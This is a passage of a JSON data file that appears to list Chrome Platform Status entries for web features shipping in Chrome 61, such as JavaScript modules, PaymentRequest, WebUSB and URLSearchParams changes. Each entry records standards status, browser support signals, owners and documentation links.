      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The smoothscroll.js code is largely broken and is preventing us from shipping scroll top interop. With the scroll top interop behavior activated sites fail to scroll at all with the wheel event. This library was corrected a few years ago but the web continues to clone the broken version and we have been blocked in shipping this long implemented fix for interop. \r\n\r\nSmooth scroll has been enabled in Chrome for a number of releases so using custom smooth scrolling is not necessary anymore.",
    "id": 5749447073988608,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1yMAUU0wCeP7BIlQujqfwe3LBnG0QJaqymbkZwor9u60/edit#"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-27 02:10:12.801670",
      "by": "ericbidelman@google.com"
    },
    "name": "JavaScript dialogs exit HTML5 fullscreen",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 61
        },
        "owners": [
          "avi@chromium.org",
          "mgiuca@chromium.org",
          "meacer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Fullscreen"
        ],
        "desktop": 61,
        "flag": false,
        "bug": "http://crbug.com/728276",
        "intervention": true
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "If a page shows a JavaScript dialog while it is in fullscreen (the HTML5 kind), it is exited from fullscreen.",
    "id": 5669548871122944,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-02-25 03:06:31.593330",
      "by": "ericbidelman@google.com"
    },
    "name": "JavaScript modules: <script type=module>",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/scripting.html#the-script-element",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1240072",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "adamk@chromium.org",
          "kouhei@chromium.org",
          "neis@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>JavaScript"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=1569",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/pull/293",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=148897",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "JavaScript modules allow a program to be divided into multiple sequences of statements and declarations. Each module explicitly identifies declarations it uses that need to be provided by other modules and which of its declarations are available for use by other modules.\r\n\r\n<script type=module> allows loading of JavaScript modules inside web pages.",
    "id": 5365692190687232,
    "resources": {
      "docs": [
        "https://blog.whatwg.org/js-modules",
        "http://tc39.github.io/ecma262/#sec-modules",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script",
        "https://jakearchibald.com/2017/es-modules-in-browsers/"
      ],
      "samples": [
        "https://paulirish.github.io/es-modules-todomvc/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-04 01:46:03.207210",
      "by": "jmedley@google.com"
    },
    "name": "MediaStream Image Capture - getPhotoSettings() method",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/mediacapture-image/#dom-imagecapture-getphotosettings",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/mediacapture-image/pull/183",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "mcasas@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>ImageCapture"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/732521",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This chrome feature tracks adding the method getPhotoSettings() [1] to the currently landed ImageCapture object [2].  It's a trivial follow up to the MediaStream Image Capture API shipped in 59 [3].\r\n\r\n[1] https://w3c.github.io/mediacapture-image/#dom-imagecapture-getphotosettings\r\n[2] https://cs.chromium.org/chromium/src/third_party/WebKit/Source/modules/imagecapture/ImageCapture.idl?q=imagecapture.idl&sq=package:chromium&dr\r\n[3] https://www.chromestatus.com/features/4843864737185792\r\n",
    "id": 5104908176982016,
    "resources": {
      "docs": [
        "https://github.com/w3c/mediacapture-image/pull/183",
        "https://developers.google.com/web/updates/2016/12/imagecapture#capabilities_and_settings",
        "https://developer.mozilla.org/en-US/docs/Web/API/ImageCapture/getPhotoSettings"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/image-capture/photo-resolution.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-04 01:51:25.727470",
      "by": "jmedley@google.com"
    },
    "name": "MediaStreamTrack.getSettings()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/mediacapture-main/getusermedia.html#media-stream-track-interface-definition",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "guidou@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>MediaStream>*"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/681824",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Returns the current settings of a MediaStreamTrack, including information such as (for video) width, height or framerate.\r\n",
    "id": 5648690194677760,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaStreamTrack/getSettings"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-01-12 12:05:43.956170",
      "by": "jkarlin@chromium.org"
    },
    "name": "Network Information",
    "comments": "The desktop implementation in Chrome 61 excludes connection type and max bandwidth except for ChromeOS.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/netinfo/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=960426",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "jkarlin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 61,
        "flag": false,
        "android": 38,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=368358",
        "intervention": false
      },
      "opera": {
        "android": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Network Information API enables web applications to access the underlying connection information of the device.\r\n",
    "id": 6338383617982464,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation",
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/connection",
        "https://developer.mozilla.org/en-US/docs/Web/API/WorkerNavigator/connection"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/network-information"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-12-13 21:46:40.281740",
      "by": "jmedley@google.com"
    },
    "name": "PaymentRequest",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/payment-request/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-payments-wg/2016Nov/0062.html",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "rouslan@chromium.org",
          "zkoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 62,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 61,
        "flag": false,
        "android": 53,
        "bug": "http://crbug.com/587995",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2016/12/15/payment-request-api-edge/#fF73ya8DCjvHDzDU.97",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-payment-request",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An API that allows browsers to act as an intermediary between the three key parties in a financial transaction: the merchant (e.g. an online web store), the buyer (e.g. the user buying from the online web store), and the Payment Method (e.g. credit card). Information necessary to process and confirm a transaction is passed between the Payment Method and the merchant via the browser with the buyer confirming and authorizing as necessary across the flow.\r\n",
    "id": 5639348045217792,
    "resources": {
      "docs": [
        "https://developers.google.com/web/fundamentals/primers/payment-request/",
        "https://developers.google.com/web/updates/2016/07/payment-request?hl=en",
        "https://youtu.be/U0LkQijSeko",
        "https://developer.mozilla.org/en-US/docs/Web/API/Payment_Request_API"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/paymentrequest/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-22 04:04:26.225110",
      "by": "estark@chromium.org"
    },
    "name": "Referrer policies 'same-origin', 'strict-origin', 'strict-origin-when-cross-origin'",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-referrer-policy/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "estark@chromium.org",
          "jochen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=729571",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Referrer Policy specification includes three policy values that Chrome doesn't yet implement.\r\n- same-origin: Send full referrers same-origin, no referrers cross-origin.\r\n- strict-origin: Strip referrers to the origin, but strip them when downgrading from HTTPS to HTTP.\r\n- strict-origin-when-cross-origin: Send full referrers same-origin, and the origin when cross-origin, but strip referrers when downgrading from HTTPS to HTTP.",
    "id": 5634117806850048,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-12-13 22:02:50.680750",
      "by": "jmedley@google.com"
    },
    "name": "Resource Timing & Navigation Timing: add nextHopProtocol property",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/resource-timing/#dfn-nexthopprotocol",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "panicker@chromium.org",
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=663175",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "nextHopProtocol has been in the spec for RT & NT but was not implemented in chrome yet.\r\nIt is now landed and will ship in M61",
    "id": 5650461096935424,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PerformanceResourceTiming",
        "https://developer.mozilla.org/en-US/docs/Web/API/PerformanceResourceTiming/nextHopProtocol"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-12-13 22:12:11.265140",
      "by": "jmedley@google.com"
    },
    "name": "Storage quota estimate() API",
    "tags": [
      "storage",
      "quota"
    ],
    "comments": "Only exposed in secure contexts (HTTPS, localhost).\r\n\r\nCan be polyfilled using navigator.webkitTemporaryStorage.queryUsageAndQuota()",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://storage.spec.whatwg.org",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>Storage>Quota"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/603992",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "navigator.storage.estimate() - returns a Promise which resolves with {usage, quota} values in bytes.",
    "id": 5630353511284736,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/StorageManager",
        "https://developer.mozilla.org/en-US/docs/Web/API/StorageManager/estimate"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:20:25.216620",
      "by": "ericbidelman@google.com"
    },
    "name": "SyncManager interface exposed to all workers",
    "tags": [
      "background sync"
    ],
    "comments": "Instances of the interface are already available in all workers, via ServiceWorkerRegistration.sync, so the interface itself should also be available for feature detection. This change brings us in line with the Background Sync spec.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://wicg.github.io/BackgroundSync/spec/#sync-manager-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1217544",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "awdf@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>BackgroundSync"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=532989",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/backgroundsyncapi/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Historically the SyncManager interface was only exposed to the window and service workers. This feature exposes the interface to all workers.",
    "id": 5703688089763840,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/SyncManager"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-03-01 15:29:26.932810",
      "by": "jmedley@google.com"
    },
    "name": "URLSearchParams: sort() method",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://url.spec.whatwg.org/#dom-urlsearchparams-sort",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "ricea@google.com",
          "yhirano@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=682143",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Sorts all name-value pairs stored in a URLSearchParams. Proposed at https://github.com/whatwg/url/issues/26 to improve cache hit rate easily.",
    "id": 5632900720492544,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams/sort"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-03-01 04:32:58.140230",
      "by": "tyoshino@chromium.org"
    },
    "name": "URLSearchParams: updated constructor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://url.spec.whatwg.org/#interface-urlsearchparams",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1331580",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "raphael.kubo.da.costa@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=680531",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=166973",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "URLSearchParams' constructor has been changed in https://github.com/whatwg/url/pull/175. It is now possible to create a new URLSearchParams by passing it any object (e.g. `new URLSearchParams({'foo': 'bar'})`).",
    "id": 5737549880360960,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams/URLSearchParams"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-04 02:03:31.487750",
      "by": "jmedley@google.com"
    },
    "name": "Update colSpan max value to 1000",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=715559",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Update colSpan max value from 8190 to 1000 as per spec change.\r\n\r\nhttps://html.spec.whatwg.org/#dom-tdth-colspan\r\nhttps://html.spec.whatwg.org/#dom-col-span\r\nhttps://html.spec.whatwg.org/#dom-colgroup-span",
    "id": 6132861220421632,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/th"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-12-13 22:15:16.102780",
      "by": "jmedley@google.com"
    },
    "name": "Web Share API",
    "tags": [
      "share"
    ],
    "comments": "Origin trial summary: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/rgIpGcOyDKI,\r\nhttps://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/kSEGnTX2dsA",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/web-share/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1312422",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "mgiuca@chromium.org",
          "sammc@chromium.org",
          "benwells@chromium.org",
          "owencm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebShare"
        ],
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/620973",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=171100",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Web Share is a proposed API for sharing data (text, URLs, images) from the web to an app of the user's choosing.",
    "id": 5668769141620736,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/10/navigator-share",
        "https://github.com/mgiuca/web-share/blob/master/docs/explainer.md",
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/share"
      ],
      "samples": [
        "https://wicg.github.io/web-share/demos/share.html"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-12-12 23:56:05.805850",
      "by": "reillyg@chromium.org"
    },
    "name": "WebUSB API",
    "tags": [
      "USB"
    ],
    "comments": "Future iteration on the API may look at shared worker and service worker support.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/webusb/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "reillyg@chromium.org",
          "scheib@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>USB"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/492204",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The web platform API to support programming USB devices.",
    "id": 5651917954875392,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/access-usb-devices-on-the-web"
      ],
      "samples": [
        "https://sowbug.github.io/weblight"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-03 23:20:35.759700",
      "by": "jmedley@google.com"
    },
    "name": "getAttributeNames() of Element interface",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-element-getattributenames",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "http://crbug.com/727433",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "getAttributeNames() is a function to rerun a list of attribute names of an element.\r\n",
    "id": 5716891221884928,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Element/getAttributeNames"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-01-04 01:56:02.685510",
      "by": "jmedley@google.com"
    },
    "name": "onwheel in GlobalEventHandlers",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://www.w3.org/TR/2016/WD-html51-20160602/webappapis.html#globaleventhandlers-globaleventhandlers",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1370550",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 61
        },
        "owners": [
          "eirage@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 61,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 61,
        "flag": false,
        "android": 61,
        "bug": "https://crbug.com/730030",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/12252712/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=125284",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Previously we had onwheel attributes as part of the Element. Now we are moving them to GlobalEventHandlers to make them consistent with the other on'event' attributes. ",
    "id": 5301074365775872,
    "resources": {
      "docs": [
        "https://github.com/w3c/web-platform-tests/pull/6165",
        "https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onwheel"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-01-04 20:46:44.456100",
      "by": "jmedley@google.com"
    },
    "name": "visualViewport API",
    "tags": [
      "viewport",
      "visual",
      "pinch",
      "zoom"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://rawgit.com/WICG/ViewportAPI/master/spec.html",
      "visibility": {
